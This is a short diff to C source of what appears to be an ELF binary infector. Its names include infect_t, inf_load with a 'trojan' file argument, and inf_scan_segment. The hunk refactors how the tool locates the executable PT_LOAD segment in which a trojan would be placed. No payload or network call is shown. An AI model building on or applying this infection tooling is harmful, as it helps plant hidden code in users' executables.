@@ -82,16 +82,16 @@ infect_t *inf_load(elf_t *elfo, FILE *trojan, open_mode_t m,
 elf_off_t inf_scan_segment(infect_t *inf) {
     ASSERT_ARG_RET_VAL(inf && inf->elfo, 0);
 
-    elf_ehdr_t *ehdr = inf->elfo->ehdr;
-    elf_phdr_t **phdrs = inf->elfo->phdrs;
     elf_phdr_t *pdata_after_check = NULL;
     elf_phdr_t *pdata = NULL;
     elf_off_t len = 0;
     bool pass_check = false;
     short found = 0;
 
-    for (int i = 0; i < ehdr->e_phnum && len == 0; ++i) {
-        pdata = (*phdrs)++;
+    int nr = inf->elfo->pmap[PT_LOAD].nr;
+    for (int i = 0; i < nr && len == 0; ++i) {
+        int idx = inf->elfo->pmap[PT_LOAD].map[i];
+        pdata = inf->elfo->phdrs[idx];
         /** .text? */
         if (!(found & PF_X) && pdata->p_type == PT_LOAD /* code */ && pdata->p_flags == (PF_R|PF_X))
         {
